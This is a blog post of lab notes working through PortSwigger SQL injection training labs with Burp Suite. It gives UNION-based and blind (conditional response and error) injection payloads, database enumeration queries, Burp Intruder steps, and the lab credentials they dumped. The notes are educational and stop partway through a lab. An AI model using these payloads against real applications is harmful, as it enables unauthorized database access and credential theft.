<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Lab - Burpsuite - SQL injection Lab" /><meta property="og:locale" content="en" /><meta name="description" content="SQL injection" /><meta property="og:description" content="SQL injection" /><link rel="canonical" href="https://ocholuo.github.io//posts/SQL-injection-Lab/" /><meta property="og:url" content="https://ocholuo.github.io//posts/SQL-injection-Lab/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-20T10:11:11-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Lab - Burpsuite - SQL injection Lab" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-11-20T10:11:11-05:00","datePublished":"2020-11-20T10:11:11-05:00","description":"SQL injection","headline":"Lab - Burpsuite - SQL injection Lab","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/SQL-injection-Lab/"},"url":"https://ocholuo.github.io//posts/SQL-injection-Lab/"}</script><title>Lab - Burpsuite - SQL injection Lab | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/huoye.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2023 Mar 14 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Lab - Burpsuite - SQL injection Lab</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Lab - Burpsuite - SQL injection Lab</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Nov 20, 2020, 10:11 AM -0500" >Nov 20, 2020<i class="unloaded">2020-11-20T10:11:11-05:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2799 words">15 min read</span> <span id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </span> views</div></div><div class="post-content"><p>[toc]</p><hr /><h1 id="sql-injection-lab">SQL injection Lab</h1><p><img data-proofer-ignore data-src="https://i.imgur.com/b4oSEzN.png" alt="Screen Shot 2020-11-20 at 19.14.01" /></p><p><img data-proofer-ignore data-src="https://i.imgur.com/DhNQ4t5.png" alt="Screen Shot 2020-11-20 at 19.14.14" /></p><p><a href="https://portswigger.net/web-security/all-labs">SQL injection lab link</a></p><hr /><h1 id="lab-sql-injection-union-attack-finding-a-column-containing-text">LAB: SQL injection UNION attack, finding a column containing text</h1><p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">SQL injection UNION attack, finding a column containing text</a></p><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Corporate</span><span class="o">+</span><span class="n">gifts</span><span class="s">'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
# HTTP/1.1 200 OK

GET /filter?category=Food+%26+Drink'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">NULL</span><span class="p">,</span><span class="s">'F8A8xB'</span><span class="p">,</span><span class="n">NULL</span><span class="o">--</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="c1"># HTTP/1.1 200 OK
</span></pre></table></code></div></div><h1 id="lab-sql-injection-union-attack-retrieving-data-from-other-tables">LAB: SQL injection UNION attack, retrieving data from other tables</h1><p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables">SQL injection UNION attack, retrieving data from other tables</a></p><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Corporate</span><span class="o">+</span><span class="n">gifts</span><span class="s">'+UNION+SELECT+'</span><span class="n">abc</span><span class="s">','</span><span class="n">def</span><span class="s">'-- HTTP/1.1
# HTTP/1.1 200 OK

GET /filter?category=Corporate+gifts'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">username</span><span class="p">,</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span><span class="o">--</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="c1"># wiener
# vq9eg0fc9drxz6o79wpu
</span>
<span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Corporate</span><span class="o">+</span><span class="n">gifts</span><span class="s">'+UNION+SELECT+username,+password+FROM+users-- HTTP/1.1
# wiener
# vq9eg0fc9drxz6o79wpu
# administrator
# jl4w29p7cx6lqfm2of19
# carlos
# nmyufdi8xv6u6w25phkt

GET /filter?category=Corporate+gifts'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">username</span><span class="p">,</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span><span class="o">+</span><span class="n">WHERE</span><span class="o">+</span><span class="n">username</span><span class="o">=</span><span class="s">'administrator'</span><span class="o">--</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="c1"># administrator
# jl4w29p7cx6lqfm2of19
</span>
<span class="c1"># https://accc1f7c1ff0e89d800368a20084008b.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+username,+password+FROM+users--
</span>
</pre></table></code></div></div><hr /><h1 id="lab-examining-the-database-in-sql-injection-attacks">LAB: Examining the database in SQL injection attacks</h1><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database">Examining the database in SQL injection attacks</a></p><div class="table-wrapper"><table><thead><tr><th>Database type<th>Query<tbody><tr><td>Microsoft, MySQL<td>SELECT @@version<tr><td>Oracle<td>SELECT * FROM v$version<tr><td>PostgreSQL<td>SELECT version()</table></div><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="c1"># Lab: SQL injection attack, querying the database type and version on Oracle:
</span><span class="s">'+UNION+SELECT+BANNER,+NULL+FROM+v$version--


GET /filter?category=Pets'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="s">'a'</span><span class="p">,</span><span class="s">'b'</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">DUAL</span><span class="o">--</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="c1"># HTTP/1.1 200 OK
</span>
<span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Pets</span><span class="s">'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/1.1
# HTTP/1.1 200 OK

'</span><span class="n">Oracle</span> <span class="n">Database</span> <span class="mi">11</span><span class="n">g</span> <span class="n">Express</span> <span class="n">Edition</span> <span class="n">Release</span> <span class="mf">11.2</span><span class="p">.</span><span class="mf">0.2</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span> <span class="mi">64</span><span class="n">bit</span> <span class="n">Production</span><span class="p">,</span>
<span class="c1"># PL/SQL Release 11.2.0.2.0 - Production,
# CORE 11.2.0.2.0 Production,
# TNS for Linux: Version 11.2.0.2.0 - Production,
# NLSRTL Version 11.2.0.2.0 - Production'
</span>


<span class="c1"># Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft:
</span>
<span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Lifestyle</span><span class="s">'+UNION+SELECT+NULL,NULL# HTTP/1.1

GET /filter?category=Lifestyle'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="s">'a'</span><span class="p">,</span><span class="s">'b'</span><span class="c1"># HTTP/1.1
</span>
<span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Lifestyle</span><span class="s">'+UNION+SELECT+@@version,NULL# HTTP/1.1

8.0.21


</span></pre></table></code></div></div><hr /><h1 id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">Lab: SQL injection attack, listing the database contents on non-Oracle databases</h1><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Gifts</span><span class="s">'+UNION+SELECT+NULL,NULL-- HTTP/1.1


# the query is returning two columns, both of which contain text:
GET /filter?category=Gifts'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="s">'a'</span><span class="p">,</span><span class="s">'b'</span><span class="o">--</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>


<span class="c1"># retrieve the list of tables in the database:
</span><span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Gifts</span><span class="s">'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/1.1


# to retrieve the details of the columns in the table:
GET /filter?category=Gifts'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">column_name</span><span class="p">,</span><span class="o">+</span><span class="n">NULL</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="o">+</span><span class="n">WHERE</span><span class="o">+</span><span class="n">table_name</span><span class="o">=</span><span class="s">'users_xdegjh'</span><span class="o">--</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>


<span class="c1"># Find the names of the columns containing usernames and passwords:
# password_ctlwsz
# username_uxtvsq
</span>

<span class="c1"># to retrieve the usernames and passwords for all users:
</span><span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Gifts</span><span class="s">'+UNION+SELECT+username_uxtvsq,+password_ctlwsz+FROM+users_xdegjh-- HTTP/1.1
# wiener
# d9r5zvpv3nbxczx2v0bk
# carlos
# 5f3wthoz0nu4ulp0dd2a
# administrator
# ln74j8tz14byaapmx6gw

</span></pre></table></code></div></div><hr /><h1 id="lab-sql-injection-attack-listing-the-database-contents-on-oracle-databases">Lab: SQL injection attack, listing the database contents on Oracle databases</h1><blockquote><p>On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. There is a built-in table on Oracle: UNION SELECT ‘abc’ FROM DUAL</p></blockquote><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c1"># the query is returning two columns, both of which contain text,:
</span><span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Gifts</span><span class="s">'+UNION+SELECT+NULL,NULL+FROM+DUAL-- HTTP/1.1
GET /filter?category=Gifts'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="s">'a'</span><span class="p">,</span><span class="s">'b'</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">DUAL</span><span class="o">--</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>


<span class="c1"># retrieve the list of tables in the database::
</span><span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Gifts</span><span class="s">'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/1.1


# retrieve the details of the columns in the table:
GET /filter?category=Gifts'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">column_name</span><span class="p">,</span><span class="n">NULL</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">all_tab_columns</span><span class="o">+</span><span class="n">WHERE</span><span class="o">+</span><span class="n">table_name</span><span class="o">=</span><span class="s">'USERS_VAGUZR'</span><span class="o">--</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="c1"># PASSWORD_NBSZJM
# USERNAME_GHYBLH
</span>

<span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Gifts</span><span class="s">'+UNION+SELECT+USERNAME_GHYBLH,+PASSWORD_NBSZJM+FROM+USERS_VAGUZR-- HTTP/1.1

# administrator
# 03rapwtg19wcl9lvh3pd
# carlos
# rvh4rbusrrz8vysx5qn2
# wiener
# obri1mfbrntngpleiena
</span></pre></table></code></div></div><hr /><h1 id="lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">LAB: SQL injection UNION attack, retrieving multiple values in a single column</h1><p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column">SQL injection UNION attack, retrieving multiple values in a single column</a></p><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c1"># the query is returning two columns, both of which contain text,:
</span><span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Gifts</span><span class="s">'+UNION+SELECT+NULL,NULL+FROM+DUAL-- HTTP/1.1
GET /filter?category=Gifts'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="s">'a'</span><span class="p">,</span><span class="s">'b'</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">DUAL</span><span class="o">--</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>



<span class="c1"># to retrieve the contents of the users table::
</span><span class="n">GET</span> <span class="o">/</span><span class="nb">filter</span><span class="err">?</span><span class="n">category</span><span class="o">=</span><span class="n">Food</span><span class="o">+%</span><span class="mi">26</span><span class="o">+</span><span class="n">Drink</span><span class="s">'+UNION+SELECT+NULL,username||'</span><span class="o">~</span><span class="s">'||password+FROM+users-- HTTP/1.1

# administrator~myvak00qtke14qpsoo1m
# carlos~5fr4ekg5n0j8e4t9vnn8
# wiener~2ynzd67h3hild5ktpbs1


</span></pre></table></code></div></div><hr /><h1 id="lab-blind-sql-injection-with-conditional-responses">Lab: Blind SQL injection with conditional responses</h1><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre><td class="rouge-code"><pre><span class="c1"># Cookie: TrackingId=GSJW5oV1q7S8PSRV; session=MiqLG5dxEgKSGSfePCdZ3M36i5Q7Ws75
</span>
<span class="c1"># modify the request containing the TrackingId cookie.
</span>

<span class="n">Cookie</span><span class="p">:</span> <span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'+OR+1=1--; session=MiqLG5dxEgKSGSfePCdZ3M36i5Q7Ws75
# -  "Welcome back" message appears in the response.


Cookie: TrackingId=x'</span><span class="o">+</span><span class="n">OR</span><span class="o">+</span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="o">--</span><span class="p">;</span> <span class="n">session</span><span class="o">=</span><span class="n">MiqLG5dxEgKSGSfePCdZ3M36i5Q7Ws75</span>
<span class="c1"># - the "Welcome back" message does not appear in the response.
</span>


<span class="n">Cookie</span><span class="p">:</span> <span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'+UNION+SELECT+'</span><span class="n">a</span><span class="s">'+FROM+users+WHERE+username='</span><span class="n">administrator</span><span class="s">'--
# - Verify that the condition is true, confirming that there is a user called administrator.



# to determine how many characters are in the password of the administrator user
Cookie: TrackingId=x'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="s">'a'</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span><span class="o">+</span><span class="n">WHERE</span><span class="o">+</span><span class="n">username</span><span class="o">=</span><span class="s">'administrator'</span><span class="o">+</span><span class="n">AND</span><span class="o">+</span><span class="nf">length</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">--</span><span class="p">.</span>
<span class="c1"># - should be true, confirming that the password is greater than 1 character in length.
# - trying 123456789-20
# - When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.
</span>


<span class="c1"># to test the character at each position to determine its value.
# - This involves a much larger number of requests,
# - need to use Burp Intruder.
# - Send the request you are working on to Burp Intruder, using the context menu.
# - Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
# - Positions tab, change the value of the cookie to:
</span>

<span class="n">Cookie</span><span class="p">:</span> <span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'+UNION+SELECT+'</span><span class="n">a</span><span class="s">'+FROM+users+WHERE+username='</span><span class="n">administrator</span><span class="s">'+AND+substring(password,1,1)='</span><span class="n">a</span><span class="s">'--
# - This uses the substring() function to extract a single character from the password, and test it against a specific value.
# - attack will cycle through each position and possible value, testing each one in turn.


# Place payload position markers around the final a character in the cookie value.
# - select just the a, and click the "Add §" button.
# - You should then see:
Cookie: TrackingId=x'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="s">'a'</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span><span class="o">+</span><span class="n">WHERE</span><span class="o">+</span><span class="n">username</span><span class="o">=</span><span class="s">'administrator'</span><span class="o">+</span><span class="n">AND</span><span class="o">+</span><span class="nf">substring</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s">'§a§'</span><span class="o">--</span>


<span class="c1"># To test the character at each position
# - need to send suitable payloads in the payload position that defined.
# - assume that the password contains only lower case alphanumeric characters.
# - Payloads tab &gt; "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9.
# - select these easily using the "Add from list" drop-down.
</span>

<span class="c1"># to tell when the correct character was submitted, need to grep each response for the expression "Welcome back".
# - Options tab, and the "Grep - Match" section.
# - Clear any existing entries in the list, and then add the value "Welcome back".
</span>

<span class="c1"># Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
# - Review the attack results to find the value of the character at the first position.
# - You should see a column in the results called "Welcome back".
# - One of the rows should have a tick in this column: r
# - The payload showing for that row is the value of the character at the first position.
</span>

<span class="c1"># re-run the attack for each of the other character positions in the password, to determine their value.
# - change the specified offset from 1 to 2.
</span>
<span class="n">Cookie</span><span class="p">:</span> <span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'+UNION+SELECT+'</span><span class="n">a</span><span class="s">'+FROM+users+WHERE+username='</span><span class="n">administrator</span><span class="s">'+AND+substring(password,2,1)='</span><span class="err">§</span><span class="n">a</span><span class="err">§</span><span class="s">'--

administrator
ryhgsiscfjwg1f0td47g
</span></pre></table></code></div></div><hr /><h1 id="lab-blind-sql-injection-with-conditional-errors">Lab: Blind SQL injection with conditional errors</h1><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="c1"># Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
</span>
<span class="n">TrackingId</span><span class="o">=</span><span class="s">'
# Modify the TrackingId cookie, Verify that an error message is received.

TrackingId=''
# Now change it to two quotation marks. Verify that the the error disappears

# This demonstrates that an error in the SQL query (in this case, the unclosed quotation mark) has a detectable effect on the response.


TrackingId='</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">CASE</span><span class="o">+</span><span class="n">WHEN</span><span class="o">+</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">THEN</span><span class="o">+</span><span class="nf">to_char</span><span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">ELSE</span><span class="o">+</span><span class="n">NULL</span><span class="o">+</span><span class="n">END</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">dual</span><span class="o">--</span>
<span class="c1"># Verify that an error message is received.
</span>
<span class="n">TrackingId</span><span class="o">=</span><span class="s">'+UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--
# Verify that the the error disappears.
# This demonstrates that you can trigger an error conditionally on the truth of a specific condition.
# The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false.
# The former expression contains a divide-by-zero, which causes an error.
# In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.


TrackingId='</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">CASE</span><span class="o">+</span><span class="n">WHEN</span><span class="o">+</span> <span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">'administrator'</span><span class="p">)</span> <span class="o">+</span><span class="n">THEN</span><span class="o">+</span><span class="nf">to_char</span><span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">ELSE</span><span class="o">+</span><span class="n">NULL</span><span class="o">+</span><span class="n">END</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span><span class="o">--</span>
<span class="c1"># Verify that the condition is true, confirming that there is a user called administrator.
</span>

<span class="c1"># to determine how many characters are in the password of the administrator user.
</span><span class="n">TrackingId</span><span class="o">=</span><span class="s">'+UNION+SELECT+CASE+WHEN+ (username='</span><span class="n">administrator</span><span class="s">'+AND+length(password)&gt;1) +THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--.
# This condition should be true, confirming that the password is greater than 1 character in length.

# Send a series of follow-up values to test different password lengths.
# manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.


# to test the character at each position to determine its value.
# Send the request you are working on to Burp Intruder
# clear the default payload positions by clicking the "Clear §" button.
